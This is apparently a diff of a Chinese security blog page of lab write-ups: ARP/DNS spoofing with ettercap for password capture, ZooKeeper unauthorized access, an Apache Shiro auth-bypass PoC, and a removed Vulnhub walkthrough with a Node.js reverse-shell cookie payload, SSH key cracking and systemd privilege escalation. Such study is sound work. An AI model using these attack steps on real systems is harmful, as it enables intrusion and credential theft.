+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.freemojo.com</span><br><span class="line">//http密码明文未加密</span><br><span class="line">http://bbs.ylnet.com.cn/forum.php</span><br><span class="line">//http密码加密了</span><br><span class="line">http://www.discuz.net/forum.php</span><br><span class="line">//https密码未加密</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="dns欺骗">DNS欺骗</span></h3><blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leafpad /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure>
+
+<p>在微软处添加：</p>
+<p>&#96;<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a> A 192.168.40.132</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/7.png" alt="image"></p>
+<p>ettercap -G（进入图形界面）</p>
+<p>重复之前的步骤ARP欺骗的步骤，在start sniffing之前添加一个插件</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/8.png" alt="image"></p>
+<p>双击启动dns_spoof</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/9.png" alt="image"></p>
+<p>开始嗅探后，我们在目标机中ping一下百度</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/10.png" alt="image"></p>
+<p>欺骗成功，如果将192.168.40.132改为钓鱼页面，就可以欺骗到用户账号密码</p>
+<p><img src="/2023/12/06/ARP-SSLStrip/11.png" alt="image"></p>
+<p>最后提醒大家，连接公共wifi时一定要小心！</p>
+</blockquote>
+<h2><span id="参考资料">参考资料</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/983d43b4ba1e">如何进行一次完整的 SSLStrip</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/paperpen/p/10810690.html">ARP欺骗之ettercap图形化界面</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/bbf50dace855">APR攻击（Arpspoof）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/li_101357/article/details/78416813">linux ip 转发设置 ip_forward、ip_forward与路由转发</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kuiguowei/article/details/79070945">HTTP&amp;HTTPS账号密码获取与ettercap局域网内DNS欺骗</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.bingyublog.com/2018/02/23/%E4%BD%BF%E7%94%A8ssltrip%E7%AA%81%E7%A0%B4ssl%E5%8A%A0%E5%AF%86%E6%88%AA%E8%8E%B7%E5%AF%86%E7%A0%81/">使用ssltrip突破ssl加密截获密码</a></p>
+<p><a target="_blank" rel="noopener" href="https://moxie.org/software/sslstrip/">sslstrip</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/5929.html">利用sslstrip和ettercap突破ssl嗅探密码</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.linuxde.net/2011/11/2522.html">针对SSL的中间人攻击演示和防范</a></p>
+<p><a target="_blank" rel="noopener" href="https://tools.kali.org/information-gathering/sslstrip">sslstrip Package Description</a></p>
 </blockquote>
 
 
@@ -831,7 +505,7 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/HTTP/" rel="tag">HTTP</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+                <a class="tag-none-link" href="/tags/ARP/" rel="tag">ARP</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/SSLStrip/" rel="tag">SSLStrip</a><a class="tag-none-link" href="/tags/WiFi/" rel="tag">WiFi</a>
             </div>
         
 
@@ -842,94 +516,78 @@
 
     
         <h2 class="title">
-            <a href="/2022/08/24/Shuriken-Node/">
-                Shuriken Node
+            <a href="/2023/12/06/CVE-2014-085-ZooKeeper/">
+                ZooKeeper 未授权访问漏洞（CVE-2014-085） 复现
             </a>
         </h2>
     
     <time>
-        Aug 24, 2022
+        Dec 6, 2023
     </time>
     <section class="content">
-        <h1><span id="shuriken-node">SHURIKEN: NODE</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称shuriken-node">名称：Shuriken: Node</span></h4><h4><span id="发布日期20201213">发布日期：2020.12.13</span></h4><h4><span id="作者thecyb3rw0lf">作者：TheCyb3rW0lf</span></h4><h4><span id="系列shuriken">系列：Shuriken</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>serv-adm:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt </p>
-<h4><span id="难度困难">难度：困难</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名shuriken_nodeova">文件名：Shuriken_Node.ova</span></h4><h4><span id="文件大小25gb">文件大小：2.5GB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimageshurikenshuriken_nodeova">下载地址：</span></h4><h4><span id="md5-5eefc9733f218d3eb5e96ca231204bac">MD5: 5EEFC9733F218D3EB5E96CA231204BAC</span></h4><h4><span id="sha1-be48eb2ce8b9faa6c016bae4776869f873f6b2b9">SHA1: BE48EB2CE8B9FAA6C016BAE4776869F873F6B2B9</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxubuntu">操作系统：Linux(ubuntu)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机shuriken_node和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2022/08/24/Shuriken-Node/1.png" alt="image-"></p>
+        <h1><span id="zookeeper-未授权访问漏洞cve-2014-085-复现">ZooKeeper 未授权访问漏洞（CVE-2014-085） 复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44108455/article/details/107708133">gclome</a> 并作补充</p>
+<p>最近想收集一下近几年的通用型漏洞，然后就找到了这个漏洞，那就先来这个漏洞吧！</p>
 </blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/2.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/3.png" alt="image-"></p>
-<p>2.再进行端口扫描，发现只开放了22和8080端口，访问8080，查看源码没有什么线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.125 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/4.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-Node/5.png" alt="image-"></p>
-<p>3.最后再进行一下目录扫描，也没有过多线索：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.125:8080 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/6.png" alt="image-"></p>
+<h2><span id="zookeeper未授权访问漏洞是什么">ZooKeeper未授权访问漏洞是什么</span></h2><blockquote>
+<p>ZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、域名服务、分布式同步、组服务等。</p>
+<p>ZooKeeper默认开启在2181端口，在未进行任何访问控制情况下，攻击者可通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境</p>
 </blockquote>
-<h3><span id="nodejs漏洞利用">Node.js漏洞利用</span></h3><blockquote>
-<p>1.根据主页提示，我们需要关注Node.js相关的问题，在exploit-db查询node.js相关的漏洞（<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41289%EF%BC%89%EF%BC%9A">https://www.exploit-db.com/exploits/41289）：</a></p>
-<p><img src="/2022/08/24/Shuriken-Node/7.png" alt="image-"></p>
-<p>2.根据漏洞文档描述，我们在<a target="_blank" rel="noopener" href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py%E4%B8%8B%E8%83%BD%E5%A4%9F%E6%89%BE%E5%88%B0%E5%88%A9%E7%94%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%9C%A8kali%E4%B8%8A%E8%8E%B7%E5%8F%96%E4%B8%80%E4%B8%8B%EF%BC%9A">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py下能够找到利用程序，在kali上获取一下：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/8.png" alt="image-"></p>
-<p>3.利用nodejsshell.py生成设定的ip和端口的shellcode，根据漏洞文档描述，要将shellcode加载后进行base64编码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python nodejsshell.py 192.168.56.102 9002</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/9.png" alt="image-"></p>
-<p>4.利用漏洞文档提供的加载器，再在<a target="_blank" rel="noopener" href="https://gchq.github.io/CyberChef/%E4%B8%8A%E8%BF%9B%E8%A1%8Cbase64%E8%BD%AC%E6%8D%A2%E5%90%8E%EF%BC%8Ckali%E7%9B%91%E5%90%AC%E5%AF%B9%E5%BA%94%E7%AB%AF%E5%8F%A3%EF%BC%8C%E6%8A%8Apayload%E6%B3%A8%E5%85%A5%E5%88%B0cookie%E4%B8%AD%EF%BC%9A">https://gchq.github.io/CyberChef/上进行base64转换后，kali监听对应端口，把payload注入到cookie中：</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#125;()&quot;&#125;，加载器</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/10.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-Node/11.png" alt="image-"></p>
-<p><img src="/2022/08/24/Shuriken-Node/12.png" alt="image-"></p>
+<h2><span id="漏洞原因">漏洞原因</span></h2><blockquote>
+<p>默认安装配置完的zookeeper允许未授权访问，管理员未配置访问控制列表（ACL）。导致攻击者可以在默认开放的2181端口下通过执行envi命令获得大量敏感信息（系统名称、java环境）导致任意用户可以在网络不受限的情况下进行未授权访问读取数据甚至杀死服务。</p>
+<p>（原因如下：默认的ACL中未进行限制访问）</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/1.png" alt="image"></p>
+<p>用于访问控制的模式有：<br>（1）world 代表任何用户<br>（2）auth 不使用任何id，代表任何已经认证过的用户<br>（3）digest 使用username:password认证，password使用md5哈希之后base64再编码，现改成了sha1加密。<br>（4）ip 用客户端的ip作为ACL的标识。</p>
 </blockquote>
-<h3><span id="ssh免密登录初步提权">SSH免密登录，初步提权</span></h3><blockquote>
-<p>1.注入cookie后，我们就获得了shell，利用python构建交互式shell：</p>
-<p><img src="/2022/08/24/Shuriken-Node/13.png" alt="image-"></p>
-<p>2.查看文件权限，发现&#x2F;var&#x2F;backups目录下有ssh-backup.zip文件，解压后得到一个id_rsa：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la /var/backups</span><br><span class="line">unzip ssh-backup.zip</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/14.png" alt="image-"></p>
-<p>3.我们在&#x2F;home目录下能够再发现serv-adm用户，这个密钥很可能就是该用户的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/15.png" alt="image-"></p>
-<p>4.id_rsa是一个加密了的密钥，我们把它复制到kali，利用ssh2john进行解密后ssh登录serv-adm：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim id_rsa.enc</span><br><span class="line">/usr/share/john/ssh2john.py id_rsa.enc &gt; id_rsa.hash</span><br><span class="line">john --wordlist=rockyou.txt id_rsa.hash</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/16.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in id_rsa.enc -out id_rsa，pasword是刚才john解出的密码</span><br><span class="line">chmod 600 id_rsa</span><br><span class="line"></span><br><span class="line">ssh serv-adm@192.168.56.125 -i id_rsa</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/17.png" alt="image-"></p>
+<h2><span id="环境搭建">环境搭建</span></h2><blockquote>
+<p>测试机： Kali （192.168.133.134）<br>靶机： Kali（192.168.133.132）<br>版本：zookeeper-3.4.14</p>
+<p>分别在测试机和靶机都安装zookeeper-3.4.14<br>安装命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#搭建环境</span></span><br><span class="line">wget https://mirrors.tuna.tsinghua.edu.cn/apache/zookeeper/zookeeper-3.4.14/zookeeper-3.4.14.tar.gz</span><br><span class="line">tar -xzvf zookeeper-3.4.14.tar.gz </span><br><span class="line"><span class="built_in">cd</span> zookeeper-3.4.14/conf</span><br><span class="line"><span class="built_in">mv</span> zoo_sample.cfg zoo.cfg</span><br><span class="line">../bin/zkServer.sh start <span class="comment"># 启动</span></span><br></pre></td></tr></table></figure>
+
+<p>搭建成功 默认端口是2181</p>
 </blockquote>
-<h3><span id="root提权">root提权</span></h3><blockquote>
-<p>1.在ser-adm用户目录下，能够发现第一个flag，user.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/18.png" alt="image-"></p>
-<p>2.利用sudo -l命令查看文件权限，发现有定时文件：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -la</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/19.png" alt="image-"></p>
-<p>3.我们查看一下shuriken-auto.timer，发现他定时执行shuriken-job.service，我们可以修改job为我们需要的提权程序：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/systemd/system</span><br><span class="line">ls -la</span><br><span class="line">cat shuriken-auto.timer</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/20.png" alt="image-"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nano shuriken-job.service</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/21.png" alt="image-"></p>
+<h2><span id="漏洞证明">漏洞证明</span></h2><blockquote>
+<p>尝试连接</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zkCli.sh -server  192.168.133.132 2181</span><br></pre></td></tr></table></figure>
+
+<p>如下图，连接成功</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/2.png" alt="image"></p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/3.png" alt="image"></p>
+<p>并且存在此漏洞！</p>
+<p>获取该服务器的环境</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> envi|nc 192.168.133.132 2181</span><br></pre></td></tr></table></figure>
+
+<p>通过执行envi命令获得系统大量的敏感信息，包括系统名称、Java环境。</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/4.png" alt="image"></p>
 </blockquote>
-<h3><span id="flag获取">Flag获取</span></h3><blockquote>
-<p>1.现在我们能重启一下时间器，获得用于提权的bashroot，执行触发获得root权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl stop shuriken-auto.timer</span><br><span class="line">sudo systemctl start shuriken-auto.timer</span><br><span class="line">/tmp/bashroot -p</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/22.png" alt="image-"></p>
-<p>2.在&#x2F;root目录下能够发现第二个flag，root.txt：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -la</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2022/08/24/Shuriken-Node/23.png" alt="image-"></p>
+<h2><span id="漏洞利用">漏洞利用</span></h2><h3><span id="part1">part1</span></h3><blockquote>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span>：列出关于性能和连接的客户端的统计信息。</span><br><span class="line"><span class="built_in">echo</span> <span class="built_in">stat</span> |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">ruok：测试服务器是否运行在非错误状态。</span><br><span class="line"><span class="built_in">echo</span> ruok |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">reqs：列出未完成的请求。</span><br><span class="line"><span class="built_in">echo</span> reqs |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">envi：打印有关服务环境的详细信息。</span><br><span class="line"><span class="built_in">echo</span> envi |nc 192.168.133.132 2181</span><br><span class="line"></span><br><span class="line">dump：列出未完成的会话和临时节点。</span><br><span class="line"><span class="built_in">echo</span> dump |nc 192.168.133.132 2181</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/5.png" alt="image"></p>
+</blockquote>
+<h3><span id="part2">part2</span></h3><blockquote>
+<p>我们在zk的客户端可以进行节点权限的查看和设置。</p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/6.png" alt="image"></p>
+<p>从上述操作可以看出，zk新创建的znode默认访问方式为world。我们通过addauth和setAcl给&#x2F;test节点设置访问权限为digest，操作权限为cdrwa，用户名为user，密码为password。</p>
+<p>当然，我们使用getAcl是无法获取可访问用户test的明文密码的（要是可以获取明文密码，不又是个漏洞嘛~~）。</p>
+<p>另启zk客户端，执行ls &#x2F;test,发现当前用户已经无法访问&#x2F;test节点，提示信息为“Authentication is not valid”。解决方法就是addauth添加认证用户了，并且必须使用用户名和密码明文进行认证。</p>
+<p>addauth添加digest认证用户user后，即可正常访问&#x2F;test节点了。</p>
+<p>另外，还有一点需要注意，znode的ACL是相互独立的。也就是说，任意不同节点可以用不同的acl列表，互不影响，并且ACL是不可被继承的。</p>
+<p>我们在&#x2F;test下创建leaf节点，可发现，leaf节点的认证方式为world，即任何用户都有访问权限。</p>
+</blockquote>
+<h4><span id="利用zookeeper可视化管理工具进行连接">利用zookeeper可视化管理工具进行连接</span></h4><blockquote>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip">https://issues.apache.org/jira/secure/attachment/12436620/ZooInspector.zip</a></p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/7.png" alt="image"></p>
+<p><img src="/2023/12/06/CVE-2014-085-ZooKeeper/8.png" alt="image"></p>
+</blockquote>
+<h2><span id="修复方案">修复方案</span></h2><blockquote>
+<p>禁止把Zookeeper直接暴露在公网</p>
+<p>添加访问控制，根据情况选择对应方式（认证用户，用户名密码，指定IP）</p>
+<p>配置防火墙策略，只允许指定IP访问2181端口</p>
+<p>配置服务ACL限制IP访问</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u011721501/article/details/44062617">https://blog.csdn.net/u011721501/article/details/44062617</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0nc3/p/12071281.html">https://www.cnblogs.com/0nc3/p/12071281.html</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6103#toc-7">https://xz.aliyun.com/t/6103#toc-7</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/Aaron_Miller/article/details/106049421">https://blog.csdn.net/Aaron_Miller/article/details/106049421</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ilovena/p/9484522.html">https://www.cnblogs.com/ilovena/p/9484522.html</a></p>
 </blockquote>
 
 
@@ -937,7 +595,365 @@
 
         
             <div class="tags">
-                <a class="tag-none-link" href="/tags/Shuriken/" rel="tag">Shuriken</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/ZooKeeper/" rel="tag">ZooKeeper</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/CVE-2020-1957-Apache-Shiro/">
+                Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞复现
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-shiro-认证绕过漏洞-cve-2020-1957-漏洞复现">Apache Shiro 认证绕过漏洞 CVE-2020-1957 漏洞复现</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44037296/article/details/119105197">Senimo_</a> 并作补充</p>
+</blockquote>
+<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
+<p>Apache Shiro 是一款开源安全框架，提供身份验证、授权、密码学和会话管理。Shiro框架直观、易用，同时也能提供健壮的安全性。<br>CVE-2020-1957，Spring Boot中使用 Apache Shiro 进行身份验证、权限控制时，可以精心构造恶意的URL，利用 Apache Shiro 和 Spring Boot 对URL的处理的差异化，可以绕过 Apache Shiro 对 Spring Boot 中的 Servlet 的权限控制，越权并实现未授权访问。</p>
+</blockquote>
+<h2><span id="漏洞影响">漏洞影响</span></h2><h3><span id="环境搭建">环境搭建</span></h3><blockquote>
+<p>执行如下命令启动一个搭载Spring 2.2.2与Shiro 1.5.1的应用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> vulhub/shiro/CVE-2020-1957</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>环境启动后，访问<code>http://x.x.x.x:8080</code>即可查看首页:</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/1.png" alt="image"></p>
+<p>这个应用中对URL权限的配置如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> ShiroFilterChainDefinition <span class="title function_">shiroFilterChainDefinition</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">DefaultShiroFilterChainDefinition</span> <span class="variable">chainDefinition</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultShiroFilterChainDefinition</span>();</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/login.html&quot;</span>, <span class="string">&quot;authc&quot;</span>); <span class="comment">// need to accept POSTs from the login form</span></span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/logout&quot;</span>, <span class="string">&quot;logout&quot;</span>);</span><br><span class="line">    chainDefinition.addPathDefinition(<span class="string">&quot;/admin/**&quot;</span>, <span class="string">&quot;authc&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> chainDefinition;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h3><span id="漏洞复现">漏洞复现</span></h3><blockquote>
+<p>使用BurpSuite抓取数据包，访问<code>/admin/</code>目录：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/2.png" alt="image"></p>
+<p>回显<code>302</code>并跳转到登录页面：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/3.png" alt="image"></p>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面：</p>
+<p><img src="/2023/12/06/CVE-2020-1957-Apache-Shiro/4.png" alt="image"></p>
+<p>URL请求过程：</p>
+<ul>
+<li>客户端请求URL: <code>/xxx/..;/admin/</code></li>
+<li>Shrio 内部处理得到校验URL为 <code>/xxxx/..</code>,校验通过</li>
+<li>SpringBoot 处理 <code>/xxx/..;/admin/</code> , 最终请求 <code>/admin/</code>, 成功访问了后台请求。</li>
+</ul>
+</blockquote>
+<h2><span id="漏洞poc">漏洞POC</span></h2><blockquote>
+<p>构造恶意请求<code>/xxx/..;/admin/</code>，即可绕过权限校验，访问到管理页面。</p>
+</blockquote>
+<h2><span id="参考链接">参考链接</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.safedog.cn/news.html?id=4441">https://www.safedog.cn/news.html?id=4441</a><br><a target="_blank" rel="noopener" href="https://blog.spoock.com/2020/05/09/cve-2020-1957/">https://blog.spoock.com/2020/05/09/cve-2020-1957/</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Apache/" rel="tag">Apache</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/06/CVE-2020-13945-Apache-APISIX/">
+                Apache APISIX 默认密钥漏洞（CVE-2020-13945）
+            </a>
+        </h2>
+    
+    <time>
+        Dec 6, 2023
+    </time>
+    <section class="content">
+        <h1><span id="apache-apisix-默认密钥漏洞cve-2020-13945">Apache APISIX 默认密钥漏洞（CVE-2020-13945）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/horistttt/article/details/124344871">horisMMM</a> 并作补充</p>
+</blockquote>
+<h2><span id="apisix简介">APISIX简介</span></h2><blockquote>
+<p>官方一句话介绍：Apache APISIX是一个高性能API网关。</p>
+<p>API网关又是什么？</p>
